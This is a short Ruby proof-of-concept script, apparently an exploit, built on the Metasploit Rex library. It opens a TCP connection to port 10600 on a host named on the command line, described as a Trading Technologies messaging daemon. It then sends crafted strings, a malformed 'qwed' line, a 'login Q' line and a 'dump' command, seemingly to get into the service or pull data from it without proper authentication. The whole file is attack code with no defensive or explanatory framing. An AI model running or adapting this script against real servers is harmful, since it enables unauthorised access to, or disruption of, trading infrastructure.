#!/usr/bin/env ruby
# Trading Technologies messaging daemon.
require 'rex'

host = ARGV[0]

def usage
 puts "[*] #{$0} <host>"
 exit
end

usage if ARGV.size < 1

begin
sock = Rex::Socket::Tcp.create('PeerHost'  => host, 
                               'PeerPort'  => 10600)

sock.write(" qwed Q\r")
select(nil,nil,nil,0.5)
sock.write("login Q\r\n")
select(nil,nil,nil,0.5)
sock.write("dump\r")
#res = sock.get_once
#puts Rex::Text.to_hex_dump(res)
rescue => e
puts "[!] #{e.to_s}"
end
